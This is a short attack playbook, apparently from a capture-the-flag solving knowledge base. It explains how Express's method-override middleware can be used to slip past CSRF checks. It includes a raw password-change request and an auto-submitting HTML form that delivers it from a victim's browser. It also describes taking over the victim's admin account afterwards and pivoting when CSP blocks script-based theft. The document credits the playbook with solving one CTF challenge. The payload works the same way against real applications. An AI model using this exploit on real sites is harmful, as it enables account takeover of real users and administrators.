# Playbook: CSRF bypass via HTTP method-override

**Trigger:** A Node/Express (or similar) app enables a **method-override** middleware
(`?_method=`, `X-HTTP-Method-Override`) AND its security checks (CSRF, auth, rate-limit)
branch on `req.method`. Often paired with an admin bot that visits user-supplied pages.

## Preconditions

- `methodOverride` is registered **before** the security middleware, so it mutates
  `req.method` first.
- The security middleware only enforces on a specific verb, e.g.
  `if (req.method !== "POST") return next();` (skips the check otherwise).
- A route handler (`app.all` / multi-verb) still performs the sensitive action as long as
  the required body/params are present, regardless of the (overridden) method.

## Minimal method

Send a request whose real body triggers the action, but whose overridden method dodges
the guard. For a check that only fires on POST:

```
POST /account/change-password?_method=GET
Content-Type: application/x-www-form-urlencoded

password=NewPass123&confirm=NewPass123
```

`methodOverride` -> `req.method = "GET"` -> CSRF check skipped -> handler sees the body ->
action executes.

Deliver it from the victim's browser via an auto-submitting form (works even under a
`CSP: sandbox allow-scripts allow-forms allow-same-origin`, which blocks fetch/iframe/
cookie-theft but not same-origin form submission):

```html
<form id="f" action="/account/change-password?_method=GET" method="POST">
<input name="password" value="NewPass123"><input name="confirm" value="NewPass123">
</form><script>document.forms[0].submit()</script>
```

Then log in as the victim (e.g. admin) with the new password and access the gated resource.

## Verification

Exploit end-to-end against the target; confirm the state change (password reset) by logging
in and reading the privileged endpoint. Official-server response = strong verification.

## Pitfalls

- Don't fixate on reading the secret via XSS if CSP `connect-src 'none'` / `frame-src 'none'`
  block fetch/iframe and cookies are httpOnly — pivot to a **state-changing** CSRF/account takeover.
- Respect handler validation (password length, matching confirm, etc.).
- The guard may key on a different verb; try `?_method=` set to any verb the guard ignores.

## Solved with this playbook

- L3akCTF2026 / Get The Flag — `cards/l3akctf_getflag.yaml`
